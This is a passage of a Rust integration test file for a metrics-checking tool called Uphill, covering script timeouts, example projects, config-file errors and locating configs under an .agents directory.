    ✓ speed      2 metrics

    1 passed, 1 failed
    "#);
}

#[test]
fn check_kills_a_script_that_times_out() {
    let project = fixture("timeout");
    let pid_file = project.path().join("pid");
    let started = Instant::now();

    let output = check(project.path(), &[("UPHILL_TEST_PID", &pid_file)]);

    assert_eq!(output.status.code(), Some(1));
    assert!(started.elapsed() < Duration::from_secs(10));
    insta::assert_snapshot!(stdout(&output), @"
    ✗ speed  script timed out after 300ms

    0 passed, 1 failed
    ");

    let pid = fs::read_to_string(&pid_file).unwrap();
    let pid = pid.trim();
    let deadline = Instant::now() + Duration::from_secs(5);
    let alive = loop {
        // `ps` prints nothing for a process that is gone, and `Z` for one that awaits its parent.
        let ps = Command::new("ps")
            .args(["-o", "stat=", "-p", pid])
            .output()
            .unwrap();
        let state = String::from_utf8_lossy(&ps.stdout).trim().to_owned();
        if state.is_empty() || state.starts_with('Z') || Instant::now() > deadline {
            break !(state.is_empty() || state.starts_with('Z'));
        }
        std::thread::sleep(Duration::from_millis(50));
    };
    assert!(
        !alive,
        "the script's background process {pid} is still running"
    );
}

#[test]
fn check_passes_every_example() {
    // Lighthouse, Cargo, and the benchmarks each take a while, so the examples run at once.
    let [typescript_library, web_app, rust_api] = std::thread::scope(|scope| {
        ["typescript-library", "web-app", "rust-api"]
            .map(|name| {
                scope.spawn(move || {
                    let (_dir, project) = example(name);
                    check(&project, &[])
                })
            })
            .map(|handle| handle.join().unwrap())
    });

    assert_eq!(typescript_library.status.code(), Some(0));
    insta::assert_snapshot!(stdout(&typescript_library), @"
    ✓ footprint      6 metrics
    ✓ speed          2 metrics
    ✓ testing        7 metrics
    ✓ correctness    7 metrics
    ✓ style          17 metrics
    ✓ architecture   10 metrics
    ✓ documentation  3 metrics
    ✓ configuration  5 metrics

    8 passed
    ");

    assert_eq!(web_app.status.code(), Some(0));
    insta::assert_snapshot!(stdout(&web_app), @"
    ✓ performance     7 metrics
    ✓ seo             1 metric
    ✓ accessibility   5 metrics
    ✓ best-practices  2 metrics

    4 passed
    ");

    assert_eq!(rust_api.status.code(), Some(0));
    insta::assert_snapshot!(stdout(&rust_api), @"
    ✓ footprint      2 metrics
    ✓ latency        3 metrics
    ✓ reliability    4 metrics
    ✓ testing        7 metrics
    ✓ correctness    15 metrics
    ✓ style          7 metrics
    ✓ architecture   2 metrics
    ✓ documentation  3 metrics
    ✓ configuration  7 metrics

    9 passed
    ");
}

#[test]
fn check_without_a_config() {
    let dir = tempfile::tempdir().unwrap();

    let output = check(dir.path(), &[]);

    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: no uphill.yaml or uphill.toml, at the root, in .agents, or in .agents/uphill, in this directory or any parent directory");
}

#[test]
fn check_with_an_invalid_config_names_it_relative_to_the_current_directory() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join(".agents")).unwrap();
    fs::write(
        dir.path().join(".agents/uphill.yaml"),
        "footprint:\n  run: \"true\"\n  size: { target: 50kb }\n",
    )
    .unwrap();
    fs::create_dir(dir.path().join("src")).unwrap();

    let output = check(&dir.path().join("src"), &[]);

    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"
    error[unknown-unit] ../.agents/uphill.yaml:3:21: unknown unit `kb`, expected one of `B`, `kB`, `MB`, `GB`, `ns`, `µs`, `us`, `ms`, `s`
      3 |   size: { target: 50kb }
        |                     ^
    ");
}

#[test]
fn agents_config_runs_from_the_project_root_and_moves_inline_targets_beside_it() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join(".agents/metrics")).unwrap();
    // An older configuration sets the metric's `target` and `baseline` keys.
    fs::write(
        dir.path().join(".agents/uphill.yaml"),
        "footprint:\n  run: sh .agents/metrics/manifests.sh\n  manifests: { target: 2, baseline: 3 } # manifests\n",
    )
    .unwrap();
    // The script counts manifests in the directory it runs from, which is the project root.
    fs::write(
        dir.path().join(".agents/metrics/manifests.sh"),
        "echo \"manifests $(ls *.json | wc -l)\" >> \"$UPHILL_METRICS\"\n",
    )
    .unwrap();
    fs::write(dir.path().join("package.json"), "{}").unwrap();

    // Started inside `.agents`, Uphill still runs from the directory above it.
    let output = uphill_in(&dir.path().join(".agents"), &["--update"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(stdout(&output), @"
    ●  99  footprint
      ●  99  manifests  1  target 2

    Since the baseline
      better  footprint  manifests  3 → 1

    Wrote ../.uphill/report.json, ../.uphill/report.md, ../.uphill/report.html, ../.agents/uphill.baseline.yaml, ../.agents/uphill.yaml
    ");
    insta::assert_snapshot!(fs::read_to_string(dir.path().join(".agents/uphill.yaml")).unwrap(), @"
    footprint:
      run: sh .agents/metrics/manifests.sh
      manifests: {} # manifests
    ");
    insta::assert_snapshot!(fs::read_to_string(dir.path().join(".agents/uphill.baseline.yaml")).unwrap(), @"
    # Each measurement's `baseline`, the size, count, or check `uphill --update` accepted, and its
    # `target`. Edit a target here, and each run reports what changed since the baseline.

    footprint:
      manifests: { baseline: 1, target: 2 }
    ");
    assert!(dir.path().join(".uphill/report.html").exists());

    fs::write(
        dir.path().join("uphill.yaml"),
        "speed:\n  run: \"true\"\n  m: {}\n",
    )
    .unwrap();
    let output = check(dir.path(), &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: uphill.yaml and .agents/uphill.yaml both exist. Keep one");
}

#[test]
fn agents_uphill_config_runs_from_the_project_root_with_its_baseline_beside_it() {
    let dir = tempfile::tempdir().unwrap();
    let uphill = dir.path().join(".agents/uphill");
    fs::create_dir_all(uphill.join("metrics")).unwrap();
    fs::write(
        uphill.join("uphill.yaml"),
        "footprint:\n  run: sh .agents/uphill/metrics/manifests.sh\n  manifests: {}\n",
    )
    .unwrap();
    // The script counts manifests in the directory it runs from, which is the project root.
    fs::write(
        uphill.join("metrics/manifests.sh"),
        "echo \"manifests $(ls *.json | wc -l)\" >> \"$UPHILL_METRICS\"\n",
    )
    .unwrap();
    fs::write(dir.path().join("package.json"), "{}").unwrap();

    // Started two levels inside `.agents`, Uphill still runs from the directory above it.
    let output = uphill_in(&uphill.join("metrics"), &["--update", "--compact"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(stdout(&output), @"
    footprint –

    No missed targets

    Since the baseline
      new  footprint  manifests

    Wrote ../../../.uphill/report.json, ../../../.uphill/report.md, ../../../.uphill/report.html, ../../../.agents/uphill/uphill.baseline.yaml
    ");
    insta::assert_snapshot!(fs::read_to_string(uphill.join("uphill.baseline.yaml")).unwrap(), @"
    # Each measurement's `baseline`, the size, count, or check `uphill --update` accepted, and its
    # `target`. Edit a target here, and each run reports what changed since the baseline.

    footprint:
      manifests: { baseline: 1 }
    ");

    fs::write(
        dir.path().join(".agents/uphill.yaml"),
        "speed:\n  run: \"true\"\n  m: {}\n",
    )
    .unwrap();
    let output = check(dir.path(), &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: .agents/uphill.yaml and .agents/uphill/uphill.yaml both exist. Keep one");
}
